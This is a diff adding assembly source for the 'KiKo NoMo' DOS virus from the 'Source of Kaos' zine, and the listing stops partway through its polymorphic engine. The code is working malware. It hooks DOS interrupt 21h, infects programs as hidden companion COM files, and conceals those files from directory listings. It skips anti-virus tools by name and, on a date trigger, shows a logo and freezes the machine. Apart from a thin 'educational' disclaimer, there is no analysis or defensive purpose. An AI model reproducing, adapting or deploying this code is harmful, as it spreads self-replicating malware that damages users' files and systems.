@@ -1,0 +1,1956 @@
+;
+;                          |- Source of Kaos -|
+;                          |-    Issue #2    -|
+;
+; Disclaimer:
+; This source code is provided educational purposes.  SOK takes no
+; responsiblity for how this source code is used.
+;
+;
+;
+;
+;"KiKo NoMo Virus": It is a Resident Companion virus, when COM file is run
+; it rename the COM to EXE and write the virus as hidden COM file. For EXE
+; file, it simply write a hidden COM file. The virus is polymorphic and the
+; Hidden COM can't be seen when it is resident. The Engine is advanced.
+;
+.286
+seg000          segment byte public 'CODE'
+
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+start:
+                call    Delta
+Delta:
+                mov     di, 100h
+                mov     cx, 0D40h       ; Virus Size = 3392
+                pop     si
+                sub     si, 3
+                push    offset Continue
+                cld
+                rep movsb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+Vec_21h_Ptr     dw 40F8h
+Vec_21h_Seg     dw 11h
+
+PCB             dw 0
+                dw 80h
+                dw 0
+                dw 5Ch
+                dw 0
+                dw 6Ch
+                dw 0
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Continue:
+                mov     ah, 4
+                mov     [si+1Ch], ds
+                mov     [si+20h], ds
+                mov     [si+24h], ds
+                mov     si, 100h
+                int     1Ah             ; Return: DL = day in BCD
+                                        ;         DH = month in BCD
+                add     dh, 1
+                cmp     dh, dl          ; Month = Day+1?
+                jnz     No_Payload
+
+                push    dx
+                add     dx, 2020h
+
+Rnd_Row_Col:
+                pop     dx
+                in      ax, 40h
+                and     ax, 303h
+                add     dx, ax
+                in      ax, 40h
+                and     ax, 303h
+                sub     dx, ax
+                push    dx
+                cmp     dl, 44          ; 80-35-1
+                ja      Rnd_Row_Col
+                cmp     dh, 18
+                ja      Rnd_Row_Col
+
+                mov     di, 6           ; Write 6 lines
+                in      ax, 40h
+                mov     bx, ax          ; Random Attribute
+                mov     bh, 0           ; Page 0
+                mov     bp, offset Logo
+
+Write_Logo:
+                mov     cx, 35          ; Length of 1 line
+                mov     ax, 1300h
+                int     10h
+                dec     di              ; Line counter -=1
+                jz      Hang_Up
+                inc     dh              ; Next row
+                add     bp, cx          ; Point to Next line
+                jmp short Write_Logo
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Hang_Up:
+                in      al, 21h         ; Interrupt controller, 8259
+                or      al, 2
+                out     21h, al         ; Interrupt controller, 8259
+                jmp short Hang_Up
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+No_Payload:
+                and     bx, 0
+                mov     ds, bx          ; DS = 0
+                mov     bl, 21h*4
+
+                mov     ax, offset ISR_21h-100h
+                xchg    ax, [bx]
+                mov     cs:[si+ISR_21h_Ptr-100h], ax
+
+                mov     ax, cs
+                add     ax, 10h
+                xchg    ax, [bx+2]
+                mov     cs:[si+ISR_21h_Seg-100h], ax
+
+                cli
+                mov     sp, offset User_Stack
+                sti
+                mov     bx, 0E40h       ; Reserve 3648 Bytes
+                mov     ah, 4Ah
+                shr     bx, 4           ; To Para.
+                inc     bx
+                int     21h             ; Shrink Mem
+
+                xor     di, di
+                mov     es, es:[di+2Ch] ; Point to Environment
+                mov     cx, 8000h
+                mov     al, 0
+
+Find_00:
+                repne scasb
+                cmp     al, es:[di]
+                loopne  Find_00
+
+                add     di, 3           ; Point to Host Name
+                push    di
+                mov     al, '.'
+                repne scasb
+                mov     ax, 'XE'
+                stosw
+                stosb                   ; Cheat the Host as EXE
+
+                pop     di
+                push    es
+                pop     ds              ; DS = ES = Environment
+                push    cs
+                pop     es              ; ES = CS
+                mov     bx, offset PCB
+                mov     ax, 4B00h
+                mov     dx, di          ; Point to Host Name (EXE)
+                int     21h             ; Run Host
+
+                mov     ah, 4Dh
+                int     21h             ; Get Exit Code AX
+                push    cs
+                pop     ds              ; DS = CS
+
+                mov     ax, cs
+                dec     ax
+                mov     es, ax          ; ES Point to MCB
+                mov     si, offset COMMAND
+                mov     di, 8           ; Owner Field
+                mov     cx, 7
+                rep movsb
+                mov     ax, 0
+                stosb                   ; Pretent COMMAND.COM
+
+                push    cs
+                pop     es
+                mov     dx, offset _End
+                int     27h             ; Go Resident
+
+
+X_Find_FCB:
+                push    bx
+                mov     bx, dx
+                test    byte ptr [bx+6], 2; Is Not Hidden?
+                jz      Not_Alter1
+                cmp     byte ptr [bx], 0FFh; Extend FCB?
+                jnz     Not_Alter1
+                xor     byte ptr [bx+6], 2; Don't Find Hidden
+
+Not_Alter1:
+                pop     bx
+                jmp short Chain_21h
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+X_Find_Handle:
+                test    cl, 2           ; Not Search Hidden file?
+                jz      Not_Alter2
+                xor     cl, 2
+
+Not_Alter2:
+                jmp short Chain_21h
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+ISR_21h:
+                pushf
+                cmp     ah, 4Eh
+                jz      X_Find_Handle
+                cmp     ah, 11h
+                jz      X_Find_FCB
+                cmp     ah, 4Bh
+                jz      Handle_Run
+
+Chain_21h:
+                popf
+                jmp     dword ptr cs:[Vec_21h_Ptr-100h]
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+_Call_21h:
+                pushf
+                call    dword ptr cs:[Vec_21h_Ptr-100h]
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Handle_Run:
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    di
+                push    si
+                push    bp
+                push    ds
+                push    es
+
+                mov     bx, 0
+                mov     es, bx          ; ES = 0
+                mov     bl, 24*4        ; Bug, (24h*4) -> (24*4)
+                push    word ptr es:[bx]
+                push    word ptr es:[bx+2]
+                push    bx
+                push    es
+                mov     word ptr es:[bx], offset ISR_24h
+                mov     es:[bx+2], cs
+
+                push    cs
+                pop     es              ; ES = CS
+                mov     si, dx          ; Source = dx
+                mov     di, offset Host_Name1
+                mov     ah, 60h         ; Parse filename
+                call    _Call_21h
+                jb      Quit_Hdl_Run
+
+                add     di, 80h
+                mov     ah, 60h
+                call    _Call_21h       ; Parse Filename
+                jb      Quit_Hdl_Run
+
+                mov     al, '.'
+                cld
+                repne scasb
+                push    cs
+                pop     ds              ; DS = CS
+                mov     si, di
+                call    File_Is_Bad?
+                jb      Quit_Hdl_Run
+
+                mov     ax, 'OC'
+                stosw
+                mov     al, 'M'
+                stosb                   ; COM
+
+                sub     di, 83h         ; First Copy
+                mov     ax, 'XE'
+                cmp     es:[di], ax
+                mov     dx, offset Host_Name2-100h
+                jz      Host_Is_EXE
+                stosw
+                stosb                   ; EXE
+
+                mov     ah, 56h         ; Rename DS:DX -> ES:DI
+                mov     di, offset Host_Name2-100h
+                call    _Call_21h
+                jb      Quit_Hdl_Run
+
+Host_Is_EXE:
+                mov     cx, 2
+                mov     ah, 5Bh         ; Create New File
+                call    _Call_21h
+                jb      Quit_Hdl_Run
+
+                push    cs
+                pop     ds
+                push    ax              ; Save Handle
+                mov     ah, 0Fh
+                mov     dx, 0B400h
+                int     10h             ; Get Current Viedo Mode AL
+                cmp     al, 7
+                jz      Use_B400h
+                mov     dx, 0BC00h
+
+Use_B400h:
+                mov     es, dx
+                in      ax, 40h
+                and     ax, 3
+                mov     bp, ax
+                mov     dx, 0           ; Start From 0
+                mov     cx, 0D40h       ; Vir Size = 3392 Bytes
+                mov     bx, 100h        ; Entry Point = 100h
+                call    Kiko_Engine
+                pop     bx
+                mov     ah, 40h         ; Write Virus
+                call    _Call_21h
+                mov     ah, 3Eh         ; Close
+                call    _Call_21h
+
+Quit_Hdl_Run:
+                pop     es
+                pop     bx
+                pop     word ptr es:[bx+2]
+                pop     word ptr es:[bx]; Restore int 24h
+                pop     es
+                pop     ds
+                pop     bp
+                pop     si
+                pop     di
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+                jmp     Chain_21h
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+ISR_24h:
+                and     al, 0
+                iret
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+File_Is_Bad?:
+                std
+                lodsb
+                cmp     al, '\'
+                jnz     File_Is_Bad?
+
+                cld
+                lodsw                   ; After "\"
+                push    di
+                mov     di, si
+                push    di
+                mov     si, offset Bad_List-100h
+                and     cx, 0
+
+Check_Next:
+                pop     di
+                push    di
+                inc     si
+                add     si, cx
+                cmp     word ptr [si-1], 0FFFFh; End mark?
+                jz      Check_Is_OK
+                and     cx, 0
+                mov     cl, [si-1]      ; Get Length
+                rep cmpsb
+                jnz     Check_Next
+                pop     di
+                pop     di
+                stc
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Check_Is_OK:
+                pop     di
+                pop     di
+                clc
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Bad_List        db 7
+COMMAND         db 'COMMAND'
+                db 5, 'BTOOL'
+                db 5, 'RTOOL'
+                db 5, 'TDISK'
+                db 5, 'CLEAN'
+                db 4, 'CKVI'
+                db 4, 'KLVI'
+                db 4, 'DEVI'
+                db 4, 'SCAN'
+                db 4, 'DRWE'
+                db 3, 'PCC'
+                db 2, 'ET'
+                db 2, 'PC'
+                db 2, 'TB'
+                db 2, 'UN'
+                db 2, 'TR'
+                db 1, 'Z'
+                db 1, 'X'
+End_Mark        dw 0FFFFh
+
+Logo            db '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<'
+                db ' This is KiKo NoMo Virus, 1993!    '
+                db ' Goal:   I want everybody to know, '
+                db '      KiKo NoMo is a Virus Writter '
+                db ' PS: Bill Yang So ungrateful,FSB!! '
+                db '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
+
+Host_Name1      db 'C:\10000.EXE',0
+byte_0_456      db 73h dup(0)
+
+Host_Name2      db 'C:\10000.COM',0
+                db 73h dup(0)
+User_Stack      db 0
+                db 0
+Engine_Logo     db 'KiKo Engine v1.0',0
+
+Store_BX        dw 100h
+Store_CX        dw 0D40h
+Store_DX        dw 0
+Store_DS        dw 78Dh
+
+                db    0 ;
+                db 0E9h ; й
+
+                db 1
+                db 0
+                db 6
+                db 4
+                db 0
+                db 0
+
+                dw 0
+                dw 0
+                dw 0
+                dw 45Ch
+                dw 445h
+                dw 48Fh
+                dw 49Bh
+                dw 41Eh
+                dw 408h
+
+                db 0
+                db 3
+                db 5
+                db 6
+                db 7
+
+                db  26h ; &
+                db  2Eh ; .
+                db  36h ; 6
+                db  3Eh ; >
+                db  91h ; ‘
+                db  98h ; 
+                db 0D6h ; Ц
+                db 0ECh ; м
+                db 0F0h ; р
+                db 0F8h ; ш
+                db 0FAh ; ъ
+                db  9Bh ; ›
+                db  9Fh ; џ
+                db 0CEh ; О
+                db 0CCh ; М
+                db 0F5h ; х
+                db    6 ;
+                db  0Eh ;
+                db  16h ;
+                db  1Eh ;
+                db  50h ; P
+                db  51h ; Q
+                db  52h ; R
+                db  53h ; S
+                db  54h ; T
+                db  55h ; U
+                db  56h ; V
+                db  57h ; W
+                db  9Ch ; њ
+                db 0FFh ; я
+                db 0FFh ; я
+                db 0FFh ; я
+                db    1 ;
+                db    4 ;
+                db    6 ;
+                db    8 ;
+                db  11h ;
+                db  12h ;
+                db  2Ch ; ,
+                db  2Dh ; -
+                db  34h ; 4
+                db  3Eh ; >
+                db  50h ; P
+                db  58h ; X
+                db  5Dh ; ]
+                db  5Fh ; _
+                db  68h ; h
+                db  6Fh ; o
+                db  68h ; h
+                db 0E8h ; и
+                db 0E9h ; й
+                db 0EBh ; л
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Kiko_Engine:
+                cld
+                mov     word ptr cs:Store_BX, bx
+                mov     word ptr cs:Store_CX, cx
+                mov     word ptr cs:Store_DX, dx
+                mov     word ptr cs:Store_DS, ds
+
+loc_0_5CC:
+                push    cs
+                pop     ds              ; DS = CS
+                xor     di, di
+                call    Write_Rubbish
+
+                push    es
+                push    cs
+                pop     es              ; ES = CS
+                mov     di, 46Ch
+                mov     cx, 9
+                xor     ax, ax
+                rep stosw
+                pop     es
+
+                call    Get_Byte_01
+                mov     byte ptr byte_0_456+10h, al
+                xor     di, di
+                call    loc_0_66B
+                call    loc_0_DDD
+                push    es
+                pop     ds
+                xor     dx, dx
+                mov     cx, di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Write_Rubbish:
+                in      ax, 40h
+                add     ax, 2E4Dh
+                neg     ax
+                stosw
+                cmp     di, 500h
+                jb      Write_Rubbish
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Get_Byte_01:
+                in      al, 40h
+                xor     al, es:[di]
+                and     al, 1
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Get_Byte_0123:
+                in      al, 40h
+                xor     al, es:[di]
+                and     al, 3
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Get_Word_0123:
+                call    Get_Byte_0123
+                nop
+                cbw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Get_Byte_0_7:
+                in      al, 40h
+                and     al, 7
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+Get_Word_0_7:
+                call    Get_Byte_0_7
+                cbw
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_625:
+                and     al, 1
+                cbw
+                add     di, ax
+                inc     di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_62C:
+                call    Get_Byte_0_7
+                mov     dh, al
+                test    byte ptr byte_0_456+0Fh, 1
+                jnz     loc_0_63B
+                and     dh, 3
+
+loc_0_63B:
+                cmp     dh, byte ptr byte_0_456+13h
+                jz      loc_0_62C
+                cmp     dh, byte ptr byte_0_456+12h
+                jz      loc_0_62C
+                cmp     dh, 4
+                jz      loc_0_62C
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_64D:
+                call    loc_0_62C
+                shl     al, 1
+                shl     al, 1
+                shl     al, 1
+                mov     dl, al
+                in      al, 40h
+                and     al, 0C7h
+                or      al, dl
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_65F:
+                call    loc_0_62C
+                mov     dl, al
+                in      al, 40h
+                and     al, 0F8h
+                or      al, dl
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_66B:
+                call    loc_0_AC1
+
+loc_0_66E:
+                cmp     di, 400h
+                jb      loc_0_66B
+                call    Get_Byte_0_7
+                cmp     al, 3
+                jz      loc_0_681
+                cmp     al, 5
+                jnb     loc_0_681
+                jmp short loc_0_66E
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_681:
+                mov     ah, al
+                mov     byte ptr byte_0_456+12h, al
+                call    Get_Byte_01
+                jz      loc_0_69F
+                call    Get_Byte_01
+                and     ah, 6
+                cmp     ah, 6
+                jz      loc_0_698
+                add     al, 2
+
+loc_0_698:
+                mov     bx, 47Fh
+                xlat
+                mov     byte ptr byte_0_456+13h, al
+
+loc_0_69F:
+                call    loc_0_78B
+                call    loc_0_AC1
+                call    loc_0_748
+                call    loc_0_AC1
+                nop
+                call    loc_0_AC1
+                call    loc_0_8D8
+                mov     word ptr byte_0_456+1Eh, di
+                stosw
+                call    loc_0_AC1
+                mov     word ptr byte_0_456+1Ch, di
+                call    loc_0_AC1
+                mov     ax, word ptr byte_0_456+12h
+                cmp     ah, 4
+                jnz     loc_0_6CC
+                jmp short loc_0_6D9
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_6CC:
+                push    ax
+                xchg    ah, al
+                mov     word ptr byte_0_456+12h, ax
+                call    loc_0_947
+                pop     word ptr byte_0_456+12h
+
+loc_0_6D9:
+                call    loc_0_AC1
+                call    Get_Byte_01
+                jz      loc_0_6F5
+                call    loc_0_7EE
+                call    loc_0_759
+
+loc_0_6E7:
+                nop
+
+loc_0_6E8:
+                call    loc_0_AC1
+
+loc_0_6EB:
+                call    loc_0_9D5
+                and     bp, 7FFFh
+                jmp short loc_0_705
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_6F5:
+                call    loc_0_9D5
+                call    loc_0_AC1
+                call    loc_0_7EE
+                call    loc_0_759
+                or      bp, 8000h
+
+loc_0_705:
+                call    loc_0_AC1
+                mov     al, 81h
+                stosb
+                mov     al, 0F8h
+                or      al, byte ptr byte_0_456+12h
+                stosb
+                mov     word ptr byte_0_456+20h, di
+                stosw
+                call    loc_0_A6E
+                mov     al, 74h
+                stosw
+                mov     word ptr byte_0_456+22h, di
+                call    loc_0_AC1
+                nop
+                mov     al, 0E9h
+                stosb
+                mov     ax, word ptr byte_0_456+1Ch
+                sub     ax, di
+                dec     ax
+                dec     ax
+                stosw
+                call    loc_0_AC1
+                mov     ax, di
+                mov     bx, word ptr byte_0_456+22h
+                sub     ax, bx
+                mov     es:[bx-1], al
+                cmp     al, 80h
+                jb      locret_0_747
+                pop     ax
+                jmp     loc_0_5CC
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+locret_0_747:
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_748:
+                call    Get_Byte_01
+                or      al, 0C6h
+                mov     ah, 6
+                stosw
+                mov     word ptr byte_0_456+24h, di
+                stosw
+                call    loc_0_625
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_759:
+                lea     si, [di-4]
+                mov     bx, word ptr byte_0_456+24h
+                mov     ax, si
+                add     ax, word ptr byte_0_456+6
+                mov     es:[bx], ax
+                mov     ax, es:[si]
+                test    byte ptr es:[bx-2], 1
+                jnz     loc_0_77B
+                xchg    al, es:[bx+2]
+                mov     es:[si], al
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_77B:
+                xchg    ax, es:[bx+2]
+                mov     es:[si], ax
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                db  36h ; 6
+                db  36h ; 6
+                db  36h ; 6
+                db  36h ; 6
+                db    6 ;
+                db  2Eh ; .
+                db  2Eh ; .
+                db    6 ;
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_78B:
+                call    Get_Byte_0123
+                add     al, al
+                mov     bx, 683h
+                mov     ah, al
+                xlat
+                xchg    ah, al
+                inc     ax
+                xlat
+                mov     byte ptr loc_0_6E8, al
+                call    Get_Byte_0123
+                or      al, 80h
+                stosw
+                mov     byte ptr loc_0_6E7, al
+                mov     word ptr byte_0_456+26h, di
+                stosw
+                cmp     al, 81h
+                jz      loc_0_7B2
+                jmp short loc_0_7B3
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_7B2:
+                inc     di
+
+loc_0_7B3:
+                inc     di
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_7B5:
+                mov     si, 472h
+                mov     bx, word ptr byte_0_456+26h
+                call    Get_Word_0123
+                add     ax, ax
+                add     si, ax
+                mov     ax, [si]
+                dec     ax
+                dec     ax
+                mov     word ptr loc_0_6E8+1, ax
+                nop
+                add     ax, word ptr byte_0_456+6
+                mov     es:[bx], ax
+                nop
+                mov     ax, es:[bx+2]
+                cmp     byte ptr loc_0_6E7, 81h
+                jz      loc_0_7E0
+                mov     ah, 90h
+
+loc_0_7E0:
+                mov     word ptr loc_0_6EB, ax
+                jmp short loc_0_7E6
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_7E6:
+                xor     word ptr es:44Eh, 90CDh
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_7EE:
+                call    Get_Byte_0_7
+                add     al, al
+                mov     byte ptr byte_0_456+28h, al
+                cmp     al, 8
+                jnb     loc_0_7FD
+                jmp short loc_0_809
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_7FD:
+                call    Get_Byte_01
+                or      al, 0F8h
+                stosb
+                mov     byte_0_CF8, al
+                call    loc_0_A6E
+
+loc_0_809:
+                call    Get_Byte_01
+                add     al, al
+                or      al, 80h
+                stosb
+
+loc_0_811:
+                in      al, 40h
+                and     al, 0C0h
+                nop
+                cmp     al, 0C0h
+                jnz     loc_0_81C
+                jmp short loc_0_811
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_81C:
+                mov     dl, al
+                mov     al, byte ptr byte_0_456+28h
+                mov     bx, 73Eh
+                mov     ah, al
+                xlat
+                xchg    ah, al
+                inc     ax
+                xlat
+                xchg    ah, al
+                mov     byte_0_CF9, ah
+                or      al, dl
+                call    loc_0_850
+                nop
+                in      al, 40h
+                stosb
+                mov     byte_0_CFA, al
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                db    0 ;
+                db  2Ch ; ,
+                db  28h ; (
+                db    4 ;
+                db  30h ; 0
+                db  34h ; 4
+                db  30h ; 0
+                db  34h ; 4
+                db  10h ;
+                db  1Ch ;
+                db  18h ;
+                db  14h ;
+                db  10h ;
+                db  1Ch ;
+                db  18h ;
+                db  14h ;
+                db  55h ; U
+                db  13h ;
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_850:
+                mov     ah, byte ptr byte_0_456+12h
+                cmp     byte ptr byte_0_456+13h, 4
+                jz      loc_0_86C
+                add     ah, byte ptr byte_0_456+13h
+                sub     ah, 9
+                mov     byte ptr byte_0_456+13h, 4
+                cmp     ah, al
+                jmp short loc_0_888
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_86C:
+                cmp     ah, 5
+                jz      loc_0_880
+                xor     ah, 2
+                cmp     ah, 1
+                jnz     loc_0_888
+                mov     ah, 7
+                cmp     al, ah
+                jmp short loc_0_888
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                nop
+
+loc_0_880:
+                mov     ah, 6
+                test    al, 0C0h
+                jnz     loc_0_888
+                or      al, 40h
+
+loc_0_888:
+                or      al, ah
+                stosb
+                mov     ah, al
+                push    ax
+                and     ah, 0C0h
+                mov     al, ah
+                cmp     ah, 40h
+                jz      loc_0_8A7
+                cmp     ah, 0
+                jz      loc_0_8B1
+                in      ax, 40h
+                cmp     ax, 1
+                jz      loc_0_8A4
+
+loc_0_8A4:
+                jmp short loc_0_8B1
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_8A6:
+                nop
+
+loc_0_8A7:
+                mov     ah, 0
+
+loc_0_8A9:
+                in      al, 40h
+                cmp     al, 80h
+                jb      loc_0_8B1
+                mov     ah, 0FFh
+
+loc_0_8B1:
+                mov     word ptr byte_0_456+14h, ax
+                mov     es:[di], ax
+                pop     ax
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                shr     al, 1
+                cbw
+                add     di, ax
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                db 0E9h ; й
+                db    7 ;
+                db 0FFh ; я
+                db    7 ;
+                db    6 ;
+                db    8 ;
+                db    6 ;
+                db    8 ;
+                db  29h ; )
+                db  2Bh ; +
+                db  31h ; 1
+                db  33h ; 3
+                db 0C0h ; А
+                db 0C8h ; И
+                db 0F0h ; р
+                db 0C8h ; И
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_8D8:
+                call    Get_Word_0123
+                mov     si, ax
+                add     si, si
+                cmp     dl, dh
+                jnb     loc_0_8E7
+
+loc_0_8E3:
+                jmp     word ptr [si+7C8h]
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_8E7:
+                jmp short loc_0_8E3
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                call    loc_0_947
+
+loc_0_8EC:
+                call    loc_0_AC1
+                mov     al, 81h
+                stosb
+                call    Get_Byte_0123
+                mov     bx, 7D4h
+                xlat
+                or      al, byte ptr byte_0_456+12h
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                mov     al, byte ptr byte_0_456+12h
+                or      al, 0B8h
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_906:
+                call    Get_Byte_0_7
+                cmp     al, 7
+                jz      loc_0_906
+                cmp     al, 4
+                jb      loc_0_92C
+                mov     ah, al
+                shl     ah, 1
+                shl     ah, 1
+                shl     ah, 1
+                or      ah, 0C0h
+                or      ah, byte ptr byte_0_456+12h
+                mov     al, 0C1h
+                stosw
+                in      al, 40h
+                or      al, 10h
+                stosb
+                cmp     bl, bh
+                jmp short loc_0_8EC
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_92C:
+                call    Get_Byte_01
+                cbw
+                add     ax, ax
+                add     ax, 0E081h
+                or      ah, byte ptr byte_0_456+12h
+                stosw
+                push    ax
+                and     ax, 0
+                stosw
+                pop     ax
+                cmp     al, 83h
+                jnz     loc_0_945
+                dec     di
+
+loc_0_945:
+                jmp short loc_0_8EC
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+
+loc_0_947:
+                call    Get_Byte_0123
+                mov     bx, 7D0h
+                xlat
+                stosb
+                mov     al, byte ptr byte_0_456+12h
+                nop
+                mov     ah, al
+                shl     ah, 1
+                shl     ah, 1
+                shl     ah, 1
+                or      al, ah
+                cmp     al, ah
+                or      al, 0C0h
+                stosb
+                retn
+;ДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДД
+                db 0E2h ; в
+                db    8 ;
+                db 0F8h ; ш
+                db    8 ;
+                db  30h ; 0
+                db    9 ;
